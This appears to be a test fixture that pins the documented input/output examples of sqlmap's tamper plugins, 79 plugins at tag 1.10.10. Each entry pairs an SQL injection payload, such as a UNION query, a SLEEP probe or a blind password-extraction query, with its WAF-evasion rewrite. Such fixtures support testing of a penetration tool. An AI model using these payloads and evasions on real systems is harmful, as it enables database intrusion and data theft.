@@ -1,0 +1,671 @@
+{
+  "_comment": "上游 sqlmap docstring 里的 >>> tamper(输入)/期望输出 对，按 tag 钉死。这是外部判据，不许手工编辑：改动只允许来自 --refresh。",
+  "tag": "1.10.10",
+  "at": "2026-10-06T10:57:06.190Z",
+  "plugins": 79,
+  "examples": 126,
+  "perPlugin": {
+    "0eunion": [
+      {
+        "input": "1 UNION ALL SELECT",
+        "output": "1e0UNION ALL SELECT"
+      }
+    ],
+    "apostrophemask": [
+      {
+        "input": "1 AND '1'='1",
+        "output": "1 AND %EF%BC%871%EF%BC%87=%EF%BC%871"
+      }
+    ],
+    "apostrophenullencode": [
+      {
+        "input": "1 AND '1'='1",
+        "output": "1 AND %00%271%00%27=%00%271"
+      }
+    ],
+    "appendnullbyte": [
+      {
+        "input": "1 AND 1=1",
+        "output": "1 AND 1=1%00"
+      }
+    ],
+    "base64encode": [
+      {
+        "input": "1' AND SLEEP(5)#",
+        "output": "MScgQU5EIFNMRUVQKDUpIw=="
+      }
+    ],
+    "between": [
+      {
+        "input": "1 AND A > B--",
+        "output": "1 AND A NOT BETWEEN 0 AND B--"
+      },
+      {
+        "input": "1 AND A = B--",
+        "output": "1 AND A BETWEEN B AND B--"
+      },
+      {
+        "input": "1 AND LAST_INSERT_ROWID()=LAST_INSERT_ROWID()",
+        "output": "1 AND LAST_INSERT_ROWID() BETWEEN LAST_INSERT_ROWID() AND LAST_INSERT_ROWID()"
+      }
+    ],
+    "binary": [
+      {
+        "input": "1 UNION ALL SELECT NULL, NULL, NULL",
+        "output": "1 UNION ALL SELECT binary NULL, binary NULL, binary NULL"
+      },
+      {
+        "input": "1 AND 2>1",
+        "output": "1 AND binary 2>binary 1"
+      },
+      {
+        "input": "CASE WHEN (1=1) THEN 1 ELSE 0x28 END",
+        "output": "CASE WHEN (binary 1=binary 1) THEN binary 1 ELSE binary 0x28 END"
+      }
+    ],
+    "blindbinary": [
+      {
+        "input": "1 AND ORD(MID((SELECT IFNULL(CAST(name AS NCHAR),0x20) FROM users ORDER BY id LIMIT 0,1),5,1))>71",
+        "output": "1 AND RIGHT(LEFT((SELECT (IF(CAST(name AS NCHAR) IS NULL,0x20,CAST(name AS NCHAR))) FROM users ORDER BY id LIMIT 0,1),5),(5<=LENGTH(CONVERT((SELECT (IF(CAST(name AS NCHAR) IS NULL,0x20,CAST(name AS NCHAR))) FROM users ORDER BY id LIMIT 0,1) USING ascii))))>BINARY 0x47"
+      },
+      {
+        "input": "1 AND ORD(MID((SELECT 1),1,1))>0",
+        "output": "1 AND RIGHT(LEFT((SELECT 1),1),(1<=LENGTH(CONVERT((SELECT 1) USING ascii))))>BINARY 0x00"
+      },
+      {
+        "input": "1 AND ORD(MID((SELECT 1),1,1)) IN (65,66,0)",
+        "output": "1 AND BINARY RIGHT(LEFT((SELECT 1),1),(1<=LENGTH(CONVERT((SELECT 1) USING ascii)))) IN (0x41,0x42,'')"
+      },
+      {
+        "input": "1 AND 5141=5141",
+        "output": "1 AND 5141=5141"
+      },
+      {
+        "input": "1 AND ORD(MID((SELECT 1),1,1))<65",
+        "output": "1 AND RIGHT(LEFT((SELECT 1),1),(1<=LENGTH(CONVERT((SELECT 1) USING ascii))))<BINARY 0x41"
+      },
+      {
+        "input": "1 AND UNICODE(SUBSTRING((SELECT TOP 1 name FROM users),3,1))>64",
+        "output": "1 AND CAST(RIGHT(LEFT((SELECT TOP 1 name FROM users),3),CASE WHEN 3<=LEN((SELECT TOP 1 name FROM users)) THEN 1 ELSE 0 END) AS VARBINARY)>0x40"
+      }
+    ],
+    "bluecoat": [
+      {
+        "input": "SELECT id FROM users WHERE id = 1",
+        "output": "SELECT%09id FROM%09users WHERE%09id LIKE 1"
+      }
+    ],
+    "castprefix": [
+      {
+        "input": "-1 UNION ALL SELECT NULL,NULL-- -",
+        "output": "cast(-1 as decimal) UNION ALL SELECT NULL,NULL-- -"
+      },
+      {
+        "input": "1 AND SLEEP(5)",
+        "output": "cast(1 as decimal) AND SLEEP(5)"
+      },
+      {
+        "input": "-4162 OR 1=1#",
+        "output": "cast(-4162 as decimal) OR 1=1#"
+      },
+      {
+        "input": "' OR 1=1-- -",
+        "output": "' OR 1=1-- -"
+      }
+    ],
+    "chardoubleencode": [
+      {
+        "input": "SELECT FIELD FROM%20TABLE",
+        "output": "%2553%2545%254C%2545%2543%2554%2520%2546%2549%2545%254C%2544%2520%2546%2552%254F%254D%2520%2554%2541%2542%254C%2545"
+      }
+    ],
+    "charencode": [
+      {
+        "input": "SELECT FIELD FROM%20TABLE",
+        "output": "%53%45%4C%45%43%54%20%46%49%45%4C%44%20%46%52%4F%4D%20%54%41%42%4C%45"
+      }
+    ],
+    "charunicodeencode": [
+      {
+        "input": "SELECT FIELD%20FROM TABLE",
+        "output": "%u0053%u0045%u004C%u0045%u0043%u0054%u0020%u0046%u0049%u0045%u004C%u0044%u0020%u0046%u0052%u004F%u004D%u0020%u0054%u0041%u0042%u004C%u0045"
+      }
+    ],
+    "charunicodeescape": [
+      {
+        "input": "SELECT FIELD FROM TABLE",
+        "output": "\\\\u0053\\\\u0045\\\\u004C\\\\u0045\\\\u0043\\\\u0054\\\\u0020\\\\u0046\\\\u0049\\\\u0045\\\\u004C\\\\u0044\\\\u0020\\\\u0046\\\\u0052\\\\u004F\\\\u004D\\\\u0020\\\\u0054\\\\u0041\\\\u0042\\\\u004C\\\\u0045"
+      }
+    ],
+    "commalesslimit": [
+      {
+        "input": "LIMIT 2, 3",
+        "output": "LIMIT 3 OFFSET 2"
+      }
+    ],
+    "commalessmid": [
+      {
+        "input": "MID(VERSION(), 1, 1)",
+        "output": "MID(VERSION() FROM 1 FOR 1)"
+      }
+    ],
+    "commentbeforeparentheses": [
+      {
+        "input": "SELECT ABS(1)",
+        "output": "SELECT ABS/**/(1)"
+      }
+    ],
+    "concat2concatws": [
+      {
+        "input": "CONCAT(1,2)",
+        "output": "CONCAT_WS(MID(CHAR(0),0,0),1,2)"
+      }
+    ],
+    "decentities": [
+      {
+        "input": "1' AND SLEEP(5)#",
+        "output": "&#49;&#39;&#32;&#65;&#78;&#68;&#32;&#83;&#76;&#69;&#69;&#80;&#40;&#53;&#41;&#35;"
+      }
+    ],
+    "dollarquote": [
+      {
+        "input": "SELECT 'abc' FROM t WHERE x='def'",
+        "output": "SELECT $$abc$$ FROM t WHERE x=$$def$$"
+      }
+    ],
+    "dunion": [
+      {
+        "input": "1 UNION ALL SELECT",
+        "output": "1DUNION ALL SELECT"
+      }
+    ],
+    "equaltolike": [
+      {
+        "input": "SELECT * FROM users WHERE id=1",
+        "output": "SELECT * FROM users WHERE id LIKE 1"
+      }
+    ],
+    "equaltorlike": [
+      {
+        "input": "SELECT * FROM users WHERE id=1",
+        "output": "SELECT * FROM users WHERE id RLIKE 1"
+      }
+    ],
+    "escapequotes": [
+      {
+        "input": "1\" AND SLEEP(5)#",
+        "output": "1\\\\\" AND SLEEP(5)#"
+      }
+    ],
+    "greatest": [
+      {
+        "input": "1 AND A > B",
+        "output": "1 AND GREATEST(A,B+1)=A"
+      }
+    ],
+    "halfversionedmorekeywords": [
+      {
+        "input": "1' UNION ALL SELECT CONCAT(CHAR(58,107,112,113,58),IFNULL(CAST(CURRENT_USER() AS CHAR),CHAR(32)),CHAR(58,97,110,121,58)), NULL, NULL# AND 'QDWa'='QDWa",
+        "output": "1'/*!0UNION/*!0ALL/*!0SELECT/*!0CONCAT(/*!0CHAR(58,107,112,113,58),/*!0IFNULL(CAST(/*!0CURRENT_USER()/*!0AS/*!0CHAR),/*!0CHAR(32)),/*!0CHAR(58,97,110,121,58)),/*!0NULL,/*!0NULL#/*!0AND 'QDWa'='QDWa"
+      }
+    ],
+    "hex2char": [
+      {
+        "input": "SELECT 0xdeadbeef",
+        "output": "SELECT CONCAT(CHAR(222),CHAR(173),CHAR(190),CHAR(239))"
+      }
+    ],
+    "hexentities": [
+      {
+        "input": "1' AND SLEEP(5)#",
+        "output": "&#x31;&#x27;&#x20;&#x41;&#x4e;&#x44;&#x20;&#x53;&#x4c;&#x45;&#x45;&#x50;&#x28;&#x35;&#x29;&#x23;"
+      }
+    ],
+    "htmlencode": [
+      {
+        "input": "1' AND SLEEP(5)#",
+        "output": "1&#39;&#32;AND&#32;SLEEP&#40;5&#41;&#35;"
+      },
+      {
+        "input": "1&#39;&#32;AND&#32;SLEEP&#40;5&#41;&#35;",
+        "output": "1&#39;&#32;AND&#32;SLEEP&#40;5&#41;&#35;"
+      }
+    ],
+    "if2case": [
+      {
+        "input": "IF(1, 2, 3)",
+        "output": "CASE WHEN (1) THEN (2) ELSE (3) END"
+      },
+      {
+        "input": "SELECT IF((1=1), (SELECT \"foo\"), NULL)",
+        "output": "SELECT CASE WHEN (1=1) THEN (SELECT \"foo\") ELSE (NULL) END"
+      }
+    ],
+    "ifnull2casewhenisnull": [
+      {
+        "input": "IFNULL(1, 2)",
+        "output": "CASE WHEN ISNULL(1) THEN (2) ELSE (1) END"
+      }
+    ],
+    "ifnull2ifisnull": [
+      {
+        "input": "IFNULL(1, 2)",
+        "output": "IF(ISNULL(1),2,1)"
+      }
+    ],
+    "informationschemacomment": [
+      {
+        "input": "SELECT table_name FROM INFORMATION_SCHEMA.TABLES",
+        "output": "SELECT table_name FROM INFORMATION_SCHEMA/**/.TABLES"
+      }
+    ],
+    "infoschema2innodb": [
+      {
+        "input": "SELECT table_name FROM information_schema.tables WHERE table_schema=0x6d6173746572 LIMIT 0,1",
+        "output": "SELECT table_name FROM mysql.innodb_table_stats WHERE database_name=0x6d6173746572 LIMIT 0,1"
+      },
+      {
+        "input": "SELECT COUNT(table_name) FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_SCHEMA=0x61",
+        "output": "SELECT COUNT(table_name) FROM mysql.innodb_table_stats WHERE database_name=0x61"
+      },
+      {
+        "input": "1 AND 1=1",
+        "output": "1 AND 1=1"
+      }
+    ],
+    "least": [
+      {
+        "input": "1 AND A > B",
+        "output": "1 AND LEAST(A,B+1)=B+1"
+      }
+    ],
+    "lowercase": [
+      {
+        "input": "INSERT",
+        "output": "insert"
+      }
+    ],
+    "mid2leftright": [
+      {
+        "input": "MID(pw, 1, 1)",
+        "output": "RIGHT(LEFT(pw, 1), 1)"
+      },
+      {
+        "input": "SUBSTRING(pw, 2, 3)",
+        "output": "RIGHT(LEFT(pw, 4), 3)"
+      },
+      {
+        "input": "1 AND SUBSTR((SELECT pw FROM users LIMIT 1),1,1)=0x73",
+        "output": "1 AND RIGHT(LEFT((SELECT pw FROM users LIMIT 1),1),1)=0x73"
+      },
+      {
+        "input": "1 AND 1=1",
+        "output": "1 AND 1=1"
+      }
+    ],
+    "misunion": [
+      {
+        "input": "1 UNION ALL SELECT",
+        "output": "1-.1UNION ALL SELECT"
+      },
+      {
+        "input": "1\" UNION ALL SELECT",
+        "output": "1\"-.1UNION ALL SELECT"
+      }
+    ],
+    "modsecurityversioned": [
+      {
+        "input": "1 AND 2>1--",
+        "output": "1 /*!30963AND 2>1*/--"
+      }
+    ],
+    "modsecurityzeroversioned": [
+      {
+        "input": "1 AND 2>1--",
+        "output": "1 /*!00000AND 2>1*/--"
+      }
+    ],
+    "mssqlnosemicolon": [
+      {
+        "input": ";WAITFOR DELAY '0:0:5'--",
+        "output": " WAITFOR DELAY '0:0:5'--"
+      },
+      {
+        "input": ";DECLARE @x CHAR(9);SET @x=0x303a303a35;WAITFOR DELAY @x",
+        "output": " DECLARE @x CHAR(9) SET @x=0x303a303a35 WAITFOR DELAY @x"
+      },
+      {
+        "input": "1' AND 'a'='a",
+        "output": "1' AND 'a'='a"
+      }
+    ],
+    "multiplespaces": [
+      {
+        "input": "1 UNION SELECT foobar",
+        "output": "1     UNION     SELECT     foobar"
+      }
+    ],
+    "odbcbrace": [
+      {
+        "input": "-1 UNION ALL SELECT NULL,CONCAT(0x716b6a7671,0x41,0x7170707671),NULL-- -",
+        "output": "{x !0}*-1 UNION ALL SELECT NULL,CONCAT(0x716b6a7671,0x41,0x7170707671),NULL-- -"
+      },
+      {
+        "input": "1 AND 5=5",
+        "output": "{x !0}*1 AND 5=5"
+      },
+      {
+        "input": "1 AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT pw FROM users LIMIT 1)))",
+        "output": "{x !0}*1 AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT pw FROM users LIMIT 1)))"
+      },
+      {
+        "input": "-4162 OR 1=1#",
+        "output": "{x !0}*-4162 OR 1=1#"
+      },
+      {
+        "input": "' UNION ALL SELECT NULL-- -",
+        "output": "' UNION ALL SELECT NULL-- -"
+      }
+    ],
+    "oraclequote": [
+      {
+        "input": "SELECT 'abc' FROM DUAL",
+        "output": "SELECT q'[abc]' FROM DUAL"
+      }
+    ],
+    "ord2ascii": [
+      {
+        "input": "ORD('42')",
+        "output": "ASCII('42')"
+      }
+    ],
+    "overlongutf8": [
+      {
+        "input": "SELECT FIELD FROM TABLE WHERE 2>1",
+        "output": "SELECT%C0%A0FIELD%C0%A0FROM%C0%A0TABLE%C0%A0WHERE%C0%A02%C0%BE1"
+      }
+    ],
+    "overlongutf8more": [
+      {
+        "input": "SELECT FIELD FROM TABLE WHERE 2>1",
+        "output": "%C1%93%C1%85%C1%8C%C1%85%C1%83%C1%94%C0%A0%C1%86%C1%89%C1%85%C1%8C%C1%84%C0%A0%C1%86%C1%92%C1%8F%C1%8D%C0%A0%C1%94%C1%81%C1%82%C1%8C%C1%85%C0%A0%C1%97%C1%88%C1%85%C1%92%C1%85%C0%A0%C0%B2%C0%BE%C0%B1"
+      }
+    ],
+    "percentage": [
+      {
+        "input": "SELECT FIELD FROM TABLE",
+        "output": "%S%E%L%E%C%T %F%I%E%L%D %F%R%O%M %T%A%B%L%E"
+      }
+    ],
+    "plus2concat": [
+      {
+        "input": "SELECT CHAR(113)+CHAR(114)+CHAR(115) FROM DUAL",
+        "output": "SELECT CONCAT(CHAR(113),CHAR(114),CHAR(115)) FROM DUAL"
+      },
+      {
+        "input": "1 UNION ALL SELECT NULL,NULL,CHAR(113)+CHAR(118)+CHAR(112)+CHAR(112)+CHAR(113)+ISNULL(CAST(@@VERSION AS NVARCHAR(4000)),CHAR(32))+CHAR(113)+CHAR(112)+CHAR(107)+CHAR(112)+CHAR(113)-- qtfe",
+        "output": "1 UNION ALL SELECT NULL,NULL,CONCAT(CHAR(113),CHAR(118),CHAR(112),CHAR(112),CHAR(113),ISNULL(CAST(@@VERSION AS NVARCHAR(4000)),CHAR(32)),CHAR(113),CHAR(112),CHAR(107),CHAR(112),CHAR(113))-- qtfe"
+      }
+    ],
+    "plus2fnconcat": [
+      {
+        "input": "SELECT CHAR(113)+CHAR(114)+CHAR(115) FROM DUAL",
+        "output": "SELECT {fn CONCAT({fn CONCAT(CHAR(113),CHAR(114))},CHAR(115))} FROM DUAL"
+      },
+      {
+        "input": "1 UNION ALL SELECT NULL,NULL,CHAR(113)+CHAR(118)+CHAR(112)+CHAR(112)+CHAR(113)+ISNULL(CAST(@@VERSION AS NVARCHAR(4000)),CHAR(32))+CHAR(113)+CHAR(112)+CHAR(107)+CHAR(112)+CHAR(113)-- qtfe",
+        "output": "1 UNION ALL SELECT NULL,NULL,{fn CONCAT({fn CONCAT({fn CONCAT({fn CONCAT({fn CONCAT({fn CONCAT({fn CONCAT({fn CONCAT({fn CONCAT({fn CONCAT(CHAR(113),CHAR(118))},CHAR(112))},CHAR(112))},CHAR(113))},ISNULL(CAST(@@VERSION AS NVARCHAR(4000)),CHAR(32)))},CHAR(113))},CHAR(112))},CHAR(107))},CHAR(112))},CHAR(113))}-- qtfe"
+      }
+    ],
+    "quote2ltat": [
+      {
+        "input": "' OR 1=1-- -",
+        "output": "'<@ OR 1=1-- -"
+      },
+      {
+        "input": "' OR LEFT((SELECT pw FROM users LIMIT 1),1)=0x73-- -",
+        "output": "'<@ OR LEFT((SELECT pw FROM users LIMIT 1),1)=0x73-- -"
+      },
+      {
+        "input": "' AND 1=1-- -",
+        "output": "' AND 1=1-- -"
+      },
+      {
+        "input": "-1 OR 1=1-- -",
+        "output": "-1 OR 1=1-- -"
+      }
+    ],
+    "randomcase": [
+      {
+        "input": "INSERT",
+        "output": "InSeRt"
+      },
+      {
+        "input": "f()",
+        "output": "f()"
+      },
+      {
+        "input": "function()",
+        "output": "FuNcTiOn()"
+      },
+      {
+        "input": "SELECT id FROM `user`",
+        "output": "SeLeCt id FrOm `user`"
+      }
+    ],
+    "randomcomments": [
+      {
+        "input": "INSERT",
+        "output": "I/**/NS/**/ERT"
+      }
+    ],
+    "schemasplit": [
+      {
+        "input": "SELECT id FROM testdb.users",
+        "output": "SELECT id FROM testdb 9.e.users"
+      }
+    ],
+    "scientific": [
+      {
+        "input": "1 AND ORD(MID((CURRENT_USER()),7,1))>1",
+        "output": "1 AND ORD 1.e(MID((CURRENT_USER 1.e( 1.e) 1.e) 1.e,7 1.e,1 1.e) 1.e)>1"
+      }
+    ],
+    "sign": [
+      {
+        "input": "1 AND A > B",
+        "output": "1 AND SIGN((A)-(B))=1"
+      }
+    ],
+    "sleep2hex": [
+      {
+        "input": "1 AND SLEEP(5)",
+        "output": "1 AND SLEEP(0x5)"
+      },
+      {
+        "input": "1 AND (SELECT SLEEP( 12 ))",
+        "output": "1 AND (SELECT SLEEP(0xc))"
+      },
+      {
+        "input": "1 AND SLEEP(0)",
+        "output": "1 AND SLEEP(0x0)"
+      },
+      {
+        "input": "1 AND 1=1",
+        "output": "1 AND 1=1"
+      }
+    ],
+    "sp_password": [
+      {
+        "input": "1 AND 9227=9227-- ",
+        "output": "1 AND 9227=9227-- sp_password"
+      }
+    ],
+    "space2comment": [
+      {
+        "input": "SELECT id FROM users",
+        "output": "SELECT/**/id/**/FROM/**/users"
+      }
+    ],
+    "space2dash": [
+      {
+        "input": "1 AND 9227=9227",
+        "output": "1--upgPydUzKpMX%0AAND--RcDKhIr%0A9227=9227"
+      }
+    ],
+    "space2hash": [
+      {
+        "input": "1 AND 9227=9227",
+        "output": "1%23upgPydUzKpMX%0AAND%23RcDKhIr%0A9227=9227"
+      }
+    ],
+    "space2morecomment": [
+      {
+        "input": "SELECT id FROM users",
+        "output": "SELECT/**_**/id/**_**/FROM/**_**/users"
+      }
+    ],
+    "space2morehash": [
+      {
+        "input": "1 AND 9227=9227",
+        "output": "1%23RcDKhIr%0AAND%23upgPydUzKpMX%0A%23lgbaxYjWJ%0A9227=9227"
+      }
+    ],
+    "space2mssqlblank": [
+      {
+        "input": "SELECT id FROM users",
+        "output": "SELECT%0Did%0DFROM%04users"
+      }
+    ],
+    "space2mssqlhash": [
+      {
+        "input": "1 AND 9227=9227",
+        "output": "1%23%0AAND%23%0A9227=9227"
+      }
+    ],
+    "space2mysqlblank": [
+      {
+        "input": "SELECT id FROM users",
+        "output": "SELECT%A0id%0CFROM%0Dusers"
+      }
+    ],
+    "space2mysqldash": [
+      {
+        "input": "1 AND 9227=9227",
+        "output": "1--%0AAND--%0A9227=9227"
+      }
+    ],
+    "space2plus": [
+      {
+        "input": "SELECT id FROM users",
+        "output": "SELECT+id+FROM+users"
+      }
+    ],
+    "space2randomblank": [
+      {
+        "input": "SELECT id FROM users",
+        "output": "SELECT%0Did%0CFROM%0Ausers"
+      }
+    ],
+    "substring2leftright": [
+      {
+        "input": "SUBSTRING((SELECT usename FROM pg_user)::text FROM 1 FOR 1)",
+        "output": "LEFT((SELECT usename FROM pg_user)::text,1)"
+      },
+      {
+        "input": "SUBSTRING((SELECT usename FROM pg_user)::text FROM 3 FOR 1)",
+        "output": "LEFT(RIGHT((SELECT usename FROM pg_user)::text,-2),1)"
+      }
+    ],
+    "symboliclogical": [
+      {
+        "input": "1 AND '1'='1",
+        "output": "1 %26%26 '1'='1"
+      }
+    ],
+    "unionalltounion": [
+      {
+        "input": "-1 UNION ALL SELECT",
+        "output": "-1 UNION SELECT"
+      }
+    ],
+    "uniontable": [
+      {
+        "input": "-1 UNION ALL SELECT * FROM users-- -",
+        "output": "-1 UNION ALL TABLE users-- -"
+      },
+      {
+        "input": "-1 UNION SELECT * FROM `mysql`.`user`#",
+        "output": "-1 UNION TABLE `mysql`.`user`#"
+      },
+      {
+        "input": "-1 UNION ALL SELECT * FROM users ORDER BY 1 LIMIT 1-- -",
+        "output": "-1 UNION ALL TABLE users ORDER BY 1 LIMIT 1-- -"
+      },
+      {
+        "input": "-1 AND (SELECT * FROM one)=0x41-- -",
+        "output": "-1 AND (TABLE one)=0x41-- -"
+      },
+      {
+        "input": "-1 UNION ALL SELECT NULL,CONCAT(0x716b6a7671,0x41,0x7170707671),NULL FROM users-- -",
+        "output": "-1 UNION ALL SELECT NULL,CONCAT(0x716b6a7671,0x41,0x7170707671),NULL FROM users-- -"
+      },
+      {
+        "input": "-1 UNION SELECT * FROM users WHERE id=1-- -",
+        "output": "-1 UNION SELECT * FROM users WHERE id=1-- -"
+      }
+    ],
+    "unionvalues": [
+      {
+        "input": "-1 UNION ALL SELECT NULL,CONCAT(0x716b6a7671,0x41,0x7170707671),NULL-- -",
+        "output": "-1 UNION ALL VALUES (NULL,CONCAT(0x716b6a7671,0x41,0x7170707671),NULL)-- -"
+      },
+      {
+        "input": "-1 UNION SELECT 45,45#",
+        "output": "-1 UNION VALUES (45,45)#"
+      },
+      {
+        "input": "-1 UNION ALL SELECT NULL,NULL FROM DUAL-- -",
+        "output": "-1 UNION ALL SELECT NULL,NULL FROM DUAL-- -"
+      }
+    ],
+    "unionvaluesrow": [
+      {
+        "input": "-1 UNION ALL SELECT NULL,CONCAT(0x716b6a7671,0x41,0x7170707671),NULL-- -",
+        "output": "-1 UNION ALL VALUES ROW(NULL,CONCAT(0x716b6a7671,0x41,0x7170707671),NULL)-- -"
+      },
+      {
+        "input": "-1 UNION SELECT 45,45#",
+        "output": "-1 UNION VALUES ROW(45,45)#"
+      },
+      {
+        "input": "-1 UNION ALL SELECT NULL,NULL FROM DUAL-- -",
+        "output": "-1 UNION ALL SELECT NULL,NULL FROM DUAL-- -"
+      }
+    ],
+    "unmagicquotes": [
+      {
+        "input": "1' AND 1=1",
+        "output": "1%bf%27-- -"
+      }
+    ],
+    "uppercase": [
+      {
+        "input": "insert",
+        "output": "INSERT"
+      }
+    ],
+    "versionedkeywords": [
+      {
+        "input": "1 UNION ALL SELECT NULL, NULL, CONCAT(CHAR(58,104,116,116,58),IFNULL(CAST(CURRENT_USER() AS CHAR),CHAR(32)),CHAR(58,100,114,117,58))#",
+        "output": "1/*!UNION*//*!ALL*//*!SELECT*//*!NULL*/,/*!NULL*/, CONCAT(CHAR(58,104,116,116,58),IFNULL(CAST(CURRENT_USER()/*!AS*//*!CHAR*/),CHAR(32)),CHAR(58,100,114,117,58))#"
+      }
+    ],
+    "versionedmorekeywords": [
+      {
+        "input": "1 UNION ALL SELECT NULL, NULL, CONCAT(CHAR(58,122,114,115,58),IFNULL(CAST(CURRENT_USER() AS CHAR),CHAR(32)),CHAR(58,115,114,121,58))#",
+        "output": "1/*!UNION*//*!ALL*//*!SELECT*//*!NULL*/,/*!NULL*/,/*!CONCAT*/(/*!CHAR*/(58,122,114,115,58),/*!IFNULL*/(CAST(/*!CURRENT_USER*/()/*!AS*//*!CHAR*/),/*!CHAR*/(32)),/*!CHAR*/(58,115,114,121,58))#"
+      }
+    ]
+  }
+}
